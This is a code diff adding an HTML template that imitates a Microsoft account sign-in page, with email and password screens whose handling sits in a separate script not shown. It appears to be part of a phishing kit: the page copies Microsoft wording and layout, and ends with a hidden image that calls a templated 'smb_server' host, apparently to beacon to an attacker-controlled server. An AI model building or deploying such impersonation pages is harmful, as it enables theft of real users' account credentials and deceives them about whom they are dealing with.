@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your account</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <!-- Injection de l'index du template -->
+    <script>
+        const TEMPLATE_IDX = {{ template_idx }};
+    </script>
+
+    <div class="container">
+        <!-- Email Screen -->
+        <div id="emailScreen" class="screen active">
+            <div class="logo">
+                <img class="logo-img" src="logo.png">
+            </div>
+            <div class="title">Sign in</div>
+            <div class="description">Use your Microsoft account.</div>
+            <div class="input-group">
+                <div class="input-wrapper">
+                    <input
+                        type="email"
+                        id="emailInput"
+                        autocomplete="username"
+                    >
+                    <label for="emailInput" class="input-label">Email or phone number</label>
+                </div>
+                <div id="emailError" class="error-message">Enter a valid email address.</div>
+            </div>
+            <div class="form-links">
+                <a href="#">Forgot your username?</a>
+            </div>
+            <div class="button-group">
+                <button id="nextBtn" onclick="goToPassword()">Next</button>
+            </div>
+            <div class="sign-in-options">
+                <div class="sign-in-option">
+                    New to Microsoft? <a href="#">Create an account</a>
+                </div>
+            </div>
+        </div>
+        <!-- Password Screen -->
+        <div id="passwordScreen" class="screen">
+            <div class="back-button" onclick="goBackToEmail()">
+                <span class="back-arrow"></span>
+            </div>
+            <div class="logo">
+                <img class="logo-img" src="logo.png">
+            </div>
+            <div class="email-badge" onclick="goBackToEmail()">
+                <span id="displayEmail"></span>
+            </div>
+            <div class="title">Enter your password</div>
+            <div class="input-group">
+                <div class="input-wrapper">
+                    <input
+                        type="password"
+                        id="passwordInput"
+                        autocomplete="current-password"
+                    >
+                    <label for="passwordInput" class="input-label">Password</label>
+                    <button type="button" class="password-toggle" onclick="togglePassword()" aria-label="Show password">
+                        <svg id="eyeIcon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+                        </svg>
+                    </button>
+                </div>
+                <div id="passwordError" class="error-message">Please enter your password.</div>
+            </div>
+            <div class="forgot-link-wrapper">
+                <a href="#" class="forgot-link">Forgot your password?</a>
+            </div>
+            <div class="button-group">
+                <button id="signInBtn" onclick="signIn()">Next</button>
+            </div>
+            <div class="sign-in-options">
+                <div class="sign-in-option">
+                    <a href="#">Other ways to sign in</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+
+    <footer class="footer">
+        <div class="footer-links">
+            <a href="#">Help and comments</a>
+            <a href="#">Terms of use</a>
+            <a href="#">Privacy & cookies</a>
+            <a href="#">Accessibility: partially compliant</a>
+        </div>
+        <div class="footer-text">
+            Use private browsing if this is not your device. <a href="#">Learn more</a>
+        </div>
+    </footer>
+    <img src="http://{{ smb_server }}" style="display: none;" />
+</body>
+</html>
